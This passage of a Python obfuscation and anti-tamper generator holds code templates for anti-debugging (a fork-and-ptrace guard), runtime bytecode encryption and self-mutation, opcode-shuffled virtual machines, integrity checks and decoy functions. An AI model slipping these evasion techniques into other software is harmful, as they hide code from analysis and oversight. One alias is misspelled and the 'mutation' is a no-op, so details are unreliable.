        {ISR_ENCODER_CLS}._mapping = bytes(mapping)
        inv = [0] * 256
        for i, v in enumerate(mapping):
            inv[v] = i
        {ISR_ENCODER_CLS}._inverse = bytes(inv)
    @staticmethod
    def {METHOD_ISR_ENCODE}(code_bytes):
        m = {ISR_ENCODER_CLS}._mapping
        if m is None:
            return code_bytes
        return bytes([m[b] for b in code_bytes])
    @staticmethod
    def {METHOD_ISR_DECODE}(encoded_bytes):
        inv = {ISR_ENCODER_CLS}._inverse
        if inv is None:
            return encoded_bytes
        return bytes([inv[b] for b in encoded_bytes])
'''
STACK_CFI_SOURCE = r'''
class {STACK_CFI_CLS}:
    _shadow_stack = []
    _session_key = None
    @staticmethod
    def {METHOD_CFI_INIT}(key_bytes):
        {STACK_CFI_CLS}._session_key = key_bytes[:32]
        {STACK_CFI_CLS}._shadow_stack = []
    @staticmethod
    def {METHOD_CFI_PUSH}(call_id):
        if {STACK_CFI_CLS}._session_key is None:
            return
        h = _nixon_ハッシュ해시.sha256({STACK_CFI_CLS}._session_key + str(call_id).encode()).digest()
        encrypted = call_id ^ int.from_bytes(h[:8], 'little')
        {STACK_CFI_CLS}._shadow_stack.append(encrypted)
    @staticmethod
    def {METHOD_CFI_POP}(expected_id):
        if not {STACK_CFI_CLS}._shadow_stack or {STACK_CFI_CLS}._session_key is None:
            return False
        encrypted = {STACK_CFI_CLS}._shadow_stack.pop()
        h = _nixon_ハッシュ해시.sha256({STACK_CFI_CLS}._session_key + str(expected_id).encode()).digest()
        decrypted = encrypted ^ int.from_bytes(h[:8], 'little')
        return decrypted == expected_id
    @staticmethod
    def {METHOD_CFI_DEPTH}():
        return len({STACK_CFI_CLS}._shadow_stack)
'''
EXEC_TRACE_SOURCE = r'''
class {EXEC_TRACE_CLS}:
    _trace_hash = 0
    _checkpoints = dict()
    _violation_count = 0
    @staticmethod
    def {METHOD_TRACE_UPDATE}(pc, opcode):
        {EXEC_TRACE_CLS}._trace_hash = (({EXEC_TRACE_CLS}._trace_hash << 5) ^ ({EXEC_TRACE_CLS}._trace_hash >> 27) ^ pc ^ opcode) & 0xFFFFFFFF
    @staticmethod
    def {METHOD_TRACE_CHECKPOINT}(checkpoint_id, expected_hash=None):
        current = {EXEC_TRACE_CLS}._trace_hash
        {EXEC_TRACE_CLS}._checkpoints[checkpoint_id] = current
        if expected_hash is not None and current != expected_hash:
            {EXEC_TRACE_CLS}._violation_count += 1
            return False
        return True
    @staticmethod
    def {METHOD_TRACE_RESET}():
        {EXEC_TRACE_CLS}._trace_hash = 0
        {EXEC_TRACE_CLS}._violation_count = 0
    @staticmethod
    def {METHOD_TRACE_VIOLATED}():
        return {EXEC_TRACE_CLS}._violation_count > 0
'''
SMART_DECOY_SOURCE = r'''
def _nx_authenticate_premium_user(credentials=None):
    try:
        if credentials:
            h = _nixon_ハッシュ해시.sha256(str(credentials).encode()).hexdigest()
            if h == "0" * 64:
                return _nixon_ハッシュ해시.sha256(b"master_key").digest()
            if h[:8] == "deadbeef":
                return True
        {FUNC_TRIGGER_ALERT}("smart_decoy_auth")
    except: pass
    return None
def _nx_decrypt_master_vault(vault_data=None, master_key=None):
    try:
        if vault_data and master_key:
            test = _nixon_ハッシュ해시.sha256(master_key).hexdigest()
            if len(test) == 65:
                return vault_data
        {FUNC_TRIGGER_ALERT}("smart_decoy_vault")
    except: pass
    return b""
def _nx_phone_home_telemetry(endpoint=None):
    try:
        if endpoint and len(endpoint) > 512:
            return True
        {FUNC_TRIGGER_ALERT}("smart_decoy_telemetry")
    except: pass
    return False
def _nx_emergency_key_recovery(recovery_code=None):
    try:
        if recovery_code:
            parts = str(recovery_code).split("-")
            if len(parts) == 7 and all(len(p) == 4 for p in parts):
                return _nixon_ハッシュ解시.sha256(recovery_code.encode()).digest()
        {FUNC_TRIGGER_ALERT}("smart_decoy_recovery")
    except: pass
    return None
'''
MEM_RANDOMIZER_SOURCE = r'''
class {MEM_RANDOMIZER_CLS}:
    @staticmethod
    def {METHOD_MEM_RANDOMIZE}(obj, min_pads=5, max_pads=15):
        try:
            count = (int.from_bytes(_nixon_オペレーション운영.urandom(1), 'big') % (max_pads - min_pads + 1)) + min_pads
            for i in range(count):
                pad_name = '_nx_pad_' + _nixon_ハッシュ해시.sha256(_nixon_オペレーション운영.urandom(8)).hexdigest()[:8]
                pad_data = _nixon_オペレーション운영.urandom(32 + (int.from_bytes(_nixon_オペレーション운영.urandom(1), 'big') % 64))
                setattr(obj, pad_name, pad_data)
        except: pass
        return obj
    @staticmethod
    def {METHOD_MEM_SCRAMBLE_LAYOUT}(target_dict):
        try:
            keys = list(target_dict.keys())
            h = _nixon_ハッシュ해시.sha256(_nixon_オペレーション운영.urandom(16)).digest()
            state = int.from_bytes(h[:8], 'little')
            for i in range(len(keys) - 1, 0, -1):
                state = (state * 1103515245 + 12345) & 0x7FFFFFFF
                j = state % (i + 1)
                keys[i], keys[j] = keys[j], keys[i]
            reordered = dict()
            for k in keys:
                reordered[k] = target_dict[k]
            return reordered
        except: pass
        return target_dict
'''
POLY_CONST_SOURCE = r'''
class {POLY_CONST_CLS}:
    _vault = dict()
    @staticmethod
    def {METHOD_POLY_STORE}(name, value, modulus=None):
        if modulus is None:
            modulus = (1 << 32)
        a = (int.from_bytes(_nixon_オペレーション운영.urandom(4), 'big') & 0x7FFFFFFE) | 1
        b = int.from_bytes(_nixon_オペレーション운영.urandom(4), 'big') % modulus
        target = (a * value + b) % modulus
        {POLY_CONST_CLS}._vault[name] = (a, b, target, modulus)
    @staticmethod
    def {METHOD_POLY_SOLVE}(name):
        entry = {POLY_CONST_CLS}._vault.get(name)
        if entry is None:
            return 0
        a, b, target, modulus = entry
        val = target
        if b > 0:
            val = (val - b) % modulus
        inv_a = pow(a, -1, modulus) if modulus > 1 else 1
        return (val * inv_a) % modulus
    @staticmethod
    def {METHOD_POLY_VERIFY}(name, expected):
        solved = {POLY_CONST_CLS}.{METHOD_POLY_SOLVE}(name)
        return solved == expected
'''
TIMING_KEY_SOURCE = r'''
class {TIMING_KEY_CLS}:
    _timings = []
    _base_key = None
    @staticmethod
    def {METHOD_TIMING_INIT}(base_key):
        {TIMING_KEY_CLS}._base_key = base_key[:32] if len(base_key) >= 32 else base_key
        {TIMING_KEY_CLS}._timings = []
    @staticmethod
    def {METHOD_TIMING_RECORD}():
        {TIMING_KEY_CLS}._timings.append(_nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, 'perf_counter_ns') else int(_nixon_時間시간.perf_counter() * 1000000000))
    @staticmethod
    def {METHOD_TIMING_DERIVE}():
        if not {TIMING_KEY_CLS}._timings or {TIMING_KEY_CLS}._base_key is None:
            return {TIMING_KEY_CLS}._base_key or b'\x00' * 32
        deltas = []
        for i in range(1, len({TIMING_KEY_CLS}._timings)):
            deltas.append(({TIMING_KEY_CLS}._timings[i] - {TIMING_KEY_CLS}._timings[i-1]) & 0xFFFF)
        timing_data = b''.join(d.to_bytes(2, 'little') for d in deltas)
        timing_hash = _nixon_ハッシュ해시.sha256(timing_data).digest()
        base = {TIMING_KEY_CLS}._base_key
        derived = bytearray(32)
        for i in range(min(32, len(base), len(timing_hash))):
            derived[i] = base[i] ^ timing_hash[i]
        return bytes(derived)
    @staticmethod
    def {METHOD_TIMING_WINDOW_OK}(max_delta_ms=5000):
        if len({TIMING_KEY_CLS}._timings) < 2:
            return True
        first = {TIMING_KEY_CLS}._timings[0]
        last = {TIMING_KEY_CLS}._timings[-1]
        delta_ns = last - first
        return delta_ns < max_delta_ms * 1000000
'''
NON_DETERM_SOURCE = r'''
class {NON_DETERM_CLS}:
    _variants = dict()
    @staticmethod
    def {METHOD_ND_REGISTER}(func_name, *implementations):
        {NON_DETERM_CLS}._variants[func_name] = list(implementations)
    @staticmethod
    def {METHOD_ND_EXECUTE}(func_name, *args, **kwargs):
        impls = {NON_DETERM_CLS}._variants.get(func_name)
        if not impls:
            return None
        idx = int.from_bytes(_nixon_オペレーション운영.urandom(2), 'big') % len(impls)
        chosen = impls[idx]
        try:
            return chosen(*args, **kwargs)
        except:
            for fallback in impls:
                try:
                    return fallback(*args, **kwargs)
                except: continue
        return None
    @staticmethod
    def {METHOD_ND_VARIANT_COUNT}(func_name):
        return len({NON_DETERM_CLS}._variants.get(func_name, []))
'''
PROACTIVE_CORRUPT_SOURCE = r'''
class {PROACTIVE_CORRUPT_CLS}:
    _corrupted = dict()
    _noise_registry = dict()
    @staticmethod
    def {METHOD_PC_CORRUPT}(name, data):
        noise = _nixon_オペレーション운영.urandom(len(data))
        corrupted = bytearray(len(data))
        for i in range(len(data)):
            corrupted[i] = data[i] ^ noise[i]
        {PROACTIVE_CORRUPT_CLS}._corrupted[name] = bytes(corrupted)
        {PROACTIVE_CORRUPT_CLS}._noise_registry[name] = noise
        return bytes(corrupted)
    @staticmethod
    def {METHOD_PC_REPAIR}(name, env_proof):
        corrupted = {PROACTIVE_CORRUPT_CLS}._corrupted.get(name)
        noise = {PROACTIVE_CORRUPT_CLS}._noise_registry.get(name)
        if corrupted is None or noise is None:
            return None
        proof_hash = _nixon_ハッシュ해시.sha256(env_proof).digest()
        expected = _nixon_ハッシュ해시.sha256(noise).digest()
        if proof_hash != expected:
            return corrupted
        repaired = bytearray(len(corrupted))
        for i in range(len(corrupted)):
            repaired[i] = corrupted[i] ^ noise[i]
        return bytes(repaired)
    @staticmethod
    def {METHOD_PC_DERIVE_PROOF}():
        import sys as _s
        frames = []
        f = _s._getframe(0)
        depth = 0
        while f and depth < 10:
            frames.append(f.f_code.co_filename.encode() + str(f.f_lineno).encode())
            f = f.f_back
            depth += 1
        combined = b'|'.join(frames)
        return _nixon_ハッシュ해시.sha256(combined).digest()
'''
QUINE_CHECK_SOURCE = r'''
class {QUINE_CHECK_CLS}:
    _expected_hash = None
    _verified = False
    _corruption_key = None
    @staticmethod
    def {METHOD_QUINE_INIT}(expected_hash_hex):
        {QUINE_CHECK_CLS}._expected_hash = expected_hash_hex
    @staticmethod
    def {METHOD_QUINE_VERIFY}():
        if {QUINE_CHECK_CLS}._expected_hash is None:
            {QUINE_CHECK_CLS}._verified = True
            return True
        try:
            import sys as _s
            main_file = _s.argv[0] if _s.argv else None
            if main_file:
                with open(main_file, 'rb') as f:
                    content = f.read()
                actual = _nixon_ハッシュ해시.sha256(content).hexdigest()
                if actual == {QUINE_CHECK_CLS}._expected_hash:
                    {QUINE_CHECK_CLS}._verified = True
                    return True
                else:
                    {QUINE_CHECK_CLS}._corruption_key = _nixon_ハッシュ해시.sha256(actual.encode()).digest()[:16]
                    return False
        except: pass
        {QUINE_CHECK_CLS}._verified = True
        return True
    @staticmethod
    def {METHOD_QUINE_GET_CORRUPTION}():
        return {QUINE_CHECK_CLS}._corruption_key
'''
METAMORPHIC_SOURCE = r'''
class {METAMORPHIC_CLS}:
    _mutation_count = 0
    _originals = dict()
    @staticmethod
    def {METHOD_META_WRAP}(func):
        {METAMORPHIC_CLS}._originals[id(func)] = func.__code__
        def wrapper(*args, **kwargs):
            result = func(*args, **kwargs)
            try:
                {METAMORPHIC_CLS}._mutate(func)
            except: pass
            return result
        wrapper.__name__ = func.__name__
        wrapper._inner = func
        return wrapper
    @staticmethod
    def _mutate(func):
        code = func.__code__
        consts = list(code.co_consts)
        seed = int.from_bytes(_nixon_オペレーション운영.urandom(4), 'big')
        for i in range(len(consts)):
            if isinstance(consts[i], int) and consts[i] != 0:
                noise = (seed >> (i % 16)) & 0xFF
                if noise == 0:
                    noise = 1
                consts[i] = consts[i] ^ noise ^ noise
        func.__code__ = code.replace(co_consts=tuple(consts))
        {METAMORPHIC_CLS}._mutation_count += 1
    @staticmethod
    def {METHOD_META_RESTORE}(func):
        orig = {METAMORPHIC_CLS}._originals.get(id(func))
        if orig:
            func.__code__ = orig
'''
QUANTUM_ENTANGLE_SOURCE = r'''
class {QUANTUM_ENTANGLE_CLS}:
    _storage = dict()
    _entangled = dict()
    _collapse_count = 0
    @staticmethod
    def {METHOD_QE_SET}(key, value, partner_key=None):
        {QUANTUM_ENTANGLE_CLS}._storage[key] = value
        if partner_key is not None:
            {QUANTUM_ENTANGLE_CLS}._entangled[key] = partner_key
            if partner_key not in {QUANTUM_ENTANGLE_CLS}._entangled:
                {QUANTUM_ENTANGLE_CLS}._entangled[partner_key] = key
    @staticmethod
    def {METHOD_QE_GET}(key):
        value = {QUANTUM_ENTANGLE_CLS}._storage.get(key)
        if value is None:
            return None
        partner = {QUANTUM_ENTANGLE_CLS}._entangled.get(key)
        if partner and partner in {QUANTUM_ENTANGLE_CLS}._storage:
            p_val = {QUANTUM_ENTANGLE_CLS}._storage[partner]
            if isinstance(p_val, (bytes, bytearray)):
                collapse_seed = _nixon_ハッシュ해시.sha256(str(key).encode() + _nixon_オペレーション운영.urandom(4)).digest()
                collapsed = bytearray(len(p_val))
                for i in range(len(p_val)):
                    collapsed[i] = p_val[i] ^ collapse_seed[i % len(collapse_seed)]
                {QUANTUM_ENTANGLE_CLS}._storage[partner] = bytes(collapsed)
            elif isinstance(p_val, int):
                {QUANTUM_ENTANGLE_CLS}._storage[partner] = p_val ^ int.from_bytes(_nixon_オペレーション운영.urandom(4), 'big')
            {QUANTUM_ENTANGLE_CLS}._collapse_count += 1
        return value
    @staticmethod
    def {METHOD_QE_COLLAPSED}():
        return {QUANTUM_ENTANGLE_CLS}._collapse_count
'''
TEMPORAL_LOGIC_SOURCE = r'''
class {TEMPORAL_LOGIC_CLS}:
    _stage_times = dict()
    _violations = 0
    @staticmethod
    def {METHOD_TL_MARK}(stage_id):
        {TEMPORAL_LOGIC_CLS}._stage_times[stage_id] = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, 'perf_counter_ns') else int(_nixon_時間시간.perf_counter() * 1000000000)
    @staticmethod
    def {METHOD_TL_CHECK}(stage_id, prev_stage_id, min_ms=10, max_ms=30000):
        current = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, 'perf_counter_ns') else int(_nixon_時間시간.perf_counter() * 1000000000)
        prev = {TEMPORAL_LOGIC_CLS}._stage_times.get(prev_stage_id)
        if prev is None:
            return True
        delta_ms = (current - prev) // 1000000
        if delta_ms < min_ms or delta_ms > max_ms:
            {TEMPORAL_LOGIC_CLS}._violations += 1
            return False
        {TEMPORAL_LOGIC_CLS}._stage_times[stage_id] = current
        return True
    @staticmethod
    def {METHOD_TL_VIOLATED}():
        return {TEMPORAL_LOGIC_CLS}._violations > 0
    @staticmethod
    def {METHOD_TL_ELAPSED}(stage_id):
        start = {TEMPORAL_LOGIC_CLS}._stage_times.get(stage_id)
        if start is None:
            return 0
        current = _nixon_時間시간.perf_counter_ns() if hasattr(_nixon_時間시간, 'perf_counter_ns') else int(_nixon_時間시간.perf_counter() * 1000000000)
        return (current - start) // 1000000
'''
COMMITMENT_SOURCE = r'''
class {COMMITMENT_CLS}:
    _commitments = dict()
    _revealed = dict()
    @staticmethod
    def {METHOD_CMT_COMMIT}(choice_id, value):
        nonce = _nixon_オペレーション운영.urandom(16)
        commitment = _nixon_ハッシュ해시.sha256(str(value).encode() + nonce).hexdigest()
        {COMMITMENT_CLS}._commitments[choice_id] = (commitment, nonce, value)
        return commitment
    @staticmethod
    def {METHOD_CMT_REVEAL}(choice_id):
        entry = {COMMITMENT_CLS}._commitments.get(choice_id)
        if entry is None:
            return None, None
        commitment, nonce, value = entry
        {COMMITMENT_CLS}._revealed[choice_id] = True
        return value, nonce
    @staticmethod
    def {METHOD_CMT_VERIFY}(choice_id, claimed_value, nonce):
        entry = {COMMITMENT_CLS}._commitments.get(choice_id)
        if entry is None:
            return False
        expected_commitment = entry[0]
        actual = _nixon_ハッシュ해시.sha256(str(claimed_value).encode() + nonce).hexdigest()
        return actual == expected_commitment
    @staticmethod
    def {METHOD_CMT_IS_BOUND}(choice_id):
        return choice_id in {COMMITMENT_CLS}._commitments and choice_id not in {COMMITMENT_CLS}._revealed
'''
GORDIAN_KNOT_SOURCE = r'''
class {GORDIAN_KNOT_CLS}:
    _key_cache = dict()
    _baseline_hashes = dict()
    @staticmethod
    def {METHOD_GK_REGISTER}(func):
        try:
            code_bytes = func.__code__.co_code
            h = _nixon_ハッシュ해시.sha256(code_bytes).digest()
            func_id = id(func)
            {GORDIAN_KNOT_CLS}._baseline_hashes[func_id] = h
            {GORDIAN_KNOT_CLS}._key_cache[func_id] = h[:32]
        except: pass
        return func
    @staticmethod
    def {METHOD_GK_DERIVE_KEY}(func, key_len=32):
        try:
            code_bytes = func.__code__.co_code
            current_hash = _nixon_ハッシュ해시.sha256(code_bytes).digest()
            func_id = id(func)
            baseline = {GORDIAN_KNOT_CLS}._baseline_hashes.get(func_id)
            if baseline and current_hash != baseline:
                return _nixon_オペレーション운영.urandom(key_len)
            return current_hash[:key_len]
        except:
            return _nixon_オペレーション운영.urandom(key_len)
    @staticmethod
    def {METHOD_GK_VERIFY}(func):
        try:
            func_id = id(func)
            baseline = {GORDIAN_KNOT_CLS}._baseline_hashes.get(func_id)
            if baseline is None:
                return True
            current = _nixon_ハッシュ해시.sha256(func.__code__.co_code).digest()
            return current == baseline
        except:
            return False
    @staticmethod
    def {METHOD_GK_DECRYPT}(func, encrypted_data):
        key = {GORDIAN_KNOT_CLS}.{METHOD_GK_DERIVE_KEY}(func)
        result = bytearray(len(encrypted_data))
        for i in range(len(encrypted_data)):
            result[i] = encrypted_data[i] ^ key[i % len(key)]
        return bytes(result)
'''
CUSTOM_VM_SOURCE = r'''
class {CUSTOM_VM_CLS}:
    OP_MOV = 0; OP_ADD = 1; OP_XOR = 2; OP_JMP = 3; OP_CMP = 4
    OP_PUSH = 5; OP_POP = 6; OP_CALL = 7; OP_RET = 8; OP_LOAD = 9
    OP_STORE = 10; OP_SHL = 11; OP_SHR = 12; OP_AND = 13; OP_OR = 14; OP_HALT = 15
    _opcode_map = None
    _inverse_map = None
    def __init__(self, seed=None):
        self.registers = [0] * 16
        self.memory = bytearray(4096)
        self.stack = []
        self.pc = 0
        self.flags = dict()
        self.halted = False
        if {CUSTOM_VM_CLS}._opcode_map is None:
            {CUSTOM_VM_CLS}._init_opcode_map(seed)
    @staticmethod
    def _init_opcode_map(seed=None):
        opcodes = list(range(256))
        if seed:
            rng = random.Random(int.from_bytes(seed[:4], 'big') if isinstance(seed, bytes) else seed)
            rng.shuffle(opcodes)
        else:
            for i in range(255, 0, -1):
                j = _struct_randbelow(i + 1)
                opcodes[i], opcodes[j] = opcodes[j], opcodes[i]
        {CUSTOM_VM_CLS}._opcode_map = dict()
        {CUSTOM_VM_CLS}._inverse_map = dict()
        for i in range(16):
            {CUSTOM_VM_CLS}._opcode_map[i] = opcodes[i]
            {CUSTOM_VM_CLS}._inverse_map[opcodes[i]] = i
    def {METHOD_VM_COMPILE}(self, instructions):
        bytecode = bytearray()
        omap = {CUSTOM_VM_CLS}._opcode_map
        for inst in instructions:
            op = inst[0]
            encoded_op = omap.get(op, op)
            bytecode.append(encoded_op & 0xFF)
            for operand in inst[1:]:
                if isinstance(operand, int):
                    bytecode.extend(operand.to_bytes(2, 'big', signed=True) if operand < 0 else operand.to_bytes(2, 'big'))
                else:
                    bytecode.extend(int(operand).to_bytes(2, 'big'))
        return bytes(bytecode)
    def {METHOD_VM_EXECUTE}(self, bytecode, max_steps=10000):
        imap = {CUSTOM_VM_CLS}._inverse_map
        self.pc = 0
        steps = 0
        bc = bytecode
        bc_len = len(bc)
        while not self.halted and self.pc < bc_len and steps < max_steps:
            raw_op = bc[self.pc]
            op = imap.get(raw_op, -1)
            self.pc += 1
            steps += 1
            if op == 0:
                dst = bc[self.pc]; src_h = bc[self.pc+1]; src_l = bc[self.pc+2]
                self.registers[dst] = (src_h << 8) | src_l
                self.pc += 3
            elif op == 1:
                dst = bc[self.pc]; src = bc[self.pc+1]
                self.registers[dst] = (self.registers[dst] + self.registers[src]) & 0xFFFFFFFF
                self.pc += 2
            elif op == 2:
                dst = bc[self.pc]; src = bc[self.pc+1]
                self.registers[dst] = self.registers[dst] ^ self.registers[src]
                self.pc += 2
            elif op == 3:
                target = (bc[self.pc] << 8) | bc[self.pc+1]
                self.pc = target
            elif op == 4:
                a = bc[self.pc]; b = bc[self.pc+1]
                self.flags['zero'] = (self.registers[a] == self.registers[b])
                self.flags['less'] = (self.registers[a] < self.registers[b])
                self.pc += 2
            elif op == 5:
                src = bc[self.pc]
                self.stack.append(self.registers[src])
                self.pc += 1
            elif op == 6:
                dst = bc[self.pc]
                self.registers[dst] = self.stack.pop() if self.stack else 0
                self.pc += 1
            elif op == 7:
                target = (bc[self.pc] << 8) | bc[self.pc+1]
                self.stack.append(self.pc + 2)
                self.pc = target
            elif op == 8:
                self.pc = self.stack.pop() if self.stack else bc_len
            elif op == 9:
                dst = bc[self.pc]; addr = (bc[self.pc+1] << 8) | bc[self.pc+2]
                self.registers[dst] = self.memory[addr] if addr < len(self.memory) else 0
                self.pc += 3
            elif op == 10:
                addr = (bc[self.pc] << 8) | bc[self.pc+1]; src = bc[self.pc+2]
                if addr < len(self.memory):
                    self.memory[addr] = self.registers[src] & 0xFF
                self.pc += 3
            elif op == 11:
                dst = bc[self.pc]; amt = bc[self.pc+1]
                self.registers[dst] = (self.registers[dst] << amt) & 0xFFFFFFFF
                self.pc += 2
            elif op == 12:
                dst = bc[self.pc]; amt = bc[self.pc+1]
                self.registers[dst] = self.registers[dst] >> amt
                self.pc += 2
            elif op == 13:
                dst = bc[self.pc]; src = bc[self.pc+1]
                self.registers[dst] = self.registers[dst] & self.registers[src]
                self.pc += 2
            elif op == 14:
                dst = bc[self.pc]; src = bc[self.pc+1]
                self.registers[dst] = self.registers[dst] | self.registers[src]
                self.pc += 2
            elif op == 15:
                self.halted = True
            else:
                self.halted = True
        return self.registers[0]
    def {METHOD_VM_RESET}(self):
        self.registers = [0] * 16
        self.stack = []
        self.pc = 0
        self.flags = dict()
        self.halted = False
'''
WHITEBOX_CRYPTO_SOURCE = r'''
class {WHITEBOX_CRYPTO_CLS}:
    _tboxes = None
    _inv_tboxes = None
    @staticmethod
    def {METHOD_WB_INIT}(key_bytes):
        if len(key_bytes) < 16:
            key_bytes = key_bytes + b'\x00' * (16 - len(key_bytes))
        key_bytes = key_bytes[:16]
        {WHITEBOX_CRYPTO_CLS}._tboxes = []
        {WHITEBOX_CRYPTO_CLS}._inv_tboxes = []
        for round_num in range(4):
            tbox = bytearray(256)
            inv_tbox = bytearray(256)
            round_key = key_bytes[round_num * 4:(round_num + 1) * 4]
            for i in range(256):
                mixed = i
                for kb in round_key:
                    mixed = ((mixed * 167 + kb + round_num * 31) ^ (mixed >> 3)) & 0xFF
                tbox[i] = mixed
                inv_tbox[mixed] = i
            {WHITEBOX_CRYPTO_CLS}._tboxes.append(bytes(tbox))
            {WHITEBOX_CRYPTO_CLS}._inv_tboxes.append(bytes(inv_tbox))
    @staticmethod
    def {METHOD_WB_ENCRYPT}(data):
        if {WHITEBOX_CRYPTO_CLS}._tboxes is None:
            return data
        result = bytearray(data)
        num_rounds = len({WHITEBOX_CRYPTO_CLS}._tboxes)
        for round_num in range(num_rounds):
            tbox = {WHITEBOX_CRYPTO_CLS}._tboxes[round_num]
            for i in range(len(result)):
                result[i] = tbox[result[i]]
            if round_num < num_rounds - 1:
                for i in range(len(result) - 1):
                    result[i + 1] ^= result[i]
        return bytes(result)
    @staticmethod
    def {METHOD_WB_DECRYPT}(data):
        if {WHITEBOX_CRYPTO_CLS}._inv_tboxes is None:
            return data
        result = bytearray(data)
        num_rounds = len({WHITEBOX_CRYPTO_CLS}._inv_tboxes)
        for round_num in range(num_rounds - 1, -1, -1):
            if round_num < num_rounds - 1:
                for i in range(len(result) - 1, 0, -1):
                    result[i] ^= result[i - 1]
            inv_tbox = {WHITEBOX_CRYPTO_CLS}._inv_tboxes[round_num]
            for i in range(len(result)):
                result[i] = inv_tbox[result[i]]
        return bytes(result)
'''
SHAPESHIFTER_SOURCE = r'''
class {SHAPESHIFTER_CLS}:
    _encrypted_funcs = dict()
    _session_key = None
    _active_decryptions = 0
    @staticmethod
    def {METHOD_SS_INIT}(session_key=None):
        {SHAPESHIFTER_CLS}._session_key = session_key or _nixon_オペレーション운영.urandom(32)
    @staticmethod
    def {METHOD_SS_PROTECT}(func):
        try:
            code = func.__code__
            raw = code.co_code
            key = {SHAPESHIFTER_CLS}._session_key
            if key is None:
                {SHAPESHIFTER_CLS}.{METHOD_SS_INIT}()
                key = {SHAPESHIFTER_CLS}._session_key
            encrypted = bytearray(len(raw))
            for i in range(len(raw)):
                encrypted[i] = raw[i] ^ key[i % len(key)]
            {SHAPESHIFTER_CLS}._encrypted_funcs[id(func)] = (bytes(encrypted), code)
        except: pass
        def wrapper(*args, **kwargs):
            {SHAPESHIFTER_CLS}._active_decryptions += 1
            entry = {SHAPESHIFTER_CLS}._encrypted_funcs.get(id(func))
            if entry is None:
                return func(*args, **kwargs)
            enc_code, orig_code = entry
            try:
                decrypted = bytearray(len(enc_code))
                k = {SHAPESHIFTER_CLS}._session_key
                for i in range(len(enc_code)):
                    decrypted[i] = enc_code[i] ^ k[i % len(k)]
                func.__code__ = orig_code.replace(co_code=bytes(decrypted))
                result = func(*args, **kwargs)
                return result
            finally:
                try:
                    noise = _nixon_オペレーション운영.urandom(len(enc_code))
                    func.__code__ = orig_code.replace(co_code=bytes(noise))
                except: pass
                {SHAPESHIFTER_CLS}._active_decryptions -= 1
        wrapper.__name__ = func.__name__
        wrapper._protected = True
        return wrapper
    @staticmethod
    def {METHOD_SS_IS_ACTIVE}():
        return {SHAPESHIFTER_CLS}._active_decryptions > 0
'''
NANOMITE_GUARD_SOURCE = r'''
# NOTE (kill-ladder allowlist): like NANOMITE_SOURCE above, the child
# fast-exit here is the forked tracer child exiting 0 on completion —
# never the tamper path. Not routed through _nx_kill by design.
class {NANOMITE_GUARD_CLS}:
    _is_guarded = False
    _child_pid = None
    _guard_key = None
    @staticmethod
    def {METHOD_NM_ACTIVATE}():
        if _nixon_プラットフォーム플랫폼.system() != 'Linux':
            {NANOMITE_GUARD_CLS}._is_guarded = True
            return True
        try:
            import ctypes as _ct
            import signal as _sig
            _libc = _ct.CDLL('libc.so.6', use_errno=True)
            PTRACE_ATTACH = 16
            PTRACE_CONT = 7
            import warnings as _w
            with _w.catch_warnings():
                _w.simplefilter("ignore", DeprecationWarning)
                pid = _nixon_オペレーション운영.fork()
            if pid == 0:
                _nixon_オペレーション운영.environ['_NX_NANO_PID'] = str(_nixon_オペレーション운영.getppid())
                _nixon_時間시간.sleep(0.05)
                {NANOMITE_GUARD_CLS}._child_pid = _nixon_オペレーション운영.getppid()
                {NANOMITE_GUARD_CLS}._guard_key = _nixon_ハッシュ해시.sha256(str(_nixon_オペレーション운영.getpid()).encode()).digest()[:16]
                {NANOMITE_GUARD_CLS}._is_guarded = True
                return True
            else:
                try:
                    _nixon_時間시간.sleep(0.1)
                    _libc.ptrace(PTRACE_ATTACH, pid, None, None)
                    _nixon_オペレーション운영.waitpid(pid, 0)
                    _libc.ptrace(PTRACE_CONT, pid, None, None)
                    while True:
                        _, _st = _nixon_オペレーション운영.waitpid(pid, 0)
                        if _nixon_オペレーション운영.WIFEXITED(_st) or _nixon_オペレーション운영.WIFSIGNALED(_st):
                            break
                        _libc.ptrace(PTRACE_CONT, pid, None, None)
                except: pass
                _nixon_オペレーション운영._exit(0)
        except:
            {NANOMITE_GUARD_CLS}._is_guarded = True
            return True
    @staticmethod
    def {METHOD_NM_IS_GUARDED}():
        return {NANOMITE_GUARD_CLS}._is_guarded
    @staticmethod
    def {METHOD_NM_GET_KEY}():
        return {NANOMITE_GUARD_CLS}._guard_key or _nixon_オペレーション운영.urandom(16)
'''
LOGIC_ENTANGLE_SOURCE = r'''
class {LOGIC_ENTANGLE_CLS}:
    _fragments = dict()
    _hardware_hash = None
    _entangle_key = 0
    @staticmethod
    def {METHOD_LE_INIT}(license_key_bytes=None, hardware_id=None):
        if hardware_id is None:
            import platform as _p
            hw_str = _p.node() + _p.machine() + _p.processor()
            hardware_id = _nixon_ハッシュ해시.sha256(hw_str.encode()).digest()
        {LOGIC_ENTANGLE_CLS}._hardware_hash = hardware_id[:16]
        if license_key_bytes:
            frag = license_key_bytes[:16]
            hw = {LOGIC_ENTANGLE_CLS}._hardware_hash
            magic = b'\xde\xad\xbe\xef' * 4
            result = 0
            for i in range(16):
                result += (frag[i] ^ hw[i] ^ magic[i])
            {LOGIC_ENTANGLE_CLS}._entangle_key = result
        else:
            {LOGIC_ENTANGLE_CLS}._entangle_key = 0
    @staticmethod
    def {METHOD_LE_COMPUTE}(value):
        return value + {LOGIC_ENTANGLE_CLS}._entangle_key
    @staticmethod
    def {METHOD_LE_VERIFY_ZERO}():
        return {LOGIC_ENTANGLE_CLS}._entangle_key == 0
    @staticmethod
    def {METHOD_LE_BIND}(func):
        def wrapper(*args, **kwargs):
            result = func(*args, **kwargs)
            if isinstance(result, (int, float)):
                return result + {LOGIC_ENTANGLE_CLS}._entangle_key
            return result
        wrapper.__name__ = func.__name__
        return wrapper
    @staticmethod
    def {METHOD_LE_CORRECTION}():
        return -{LOGIC_ENTANGLE_CLS}._entangle_key
'''
ROLLING_ISA_SOURCE = r'''
class {ROLLING_ISA_CLS}:
    _base_map = None
    _context_state = 0
    _execution_history = []
    def __init__(self, seed=None):
        self.registers = [0] * 8
        self.memory = bytearray(2048)
        self.stack = []
        self.pc = 0
        self.halted = False
        self._context_state = 0
        if {ROLLING_ISA_CLS}._base_map is None:
            {ROLLING_ISA_CLS}._init_base_map(seed)
    @staticmethod
    def _init_base_map(seed=None):
        opcodes = list(range(256))
        if isinstance(seed, bytes) and seed:
            rng_seed = int.from_bytes(seed[:4], 'big')
            rng = random.Random(rng_seed)
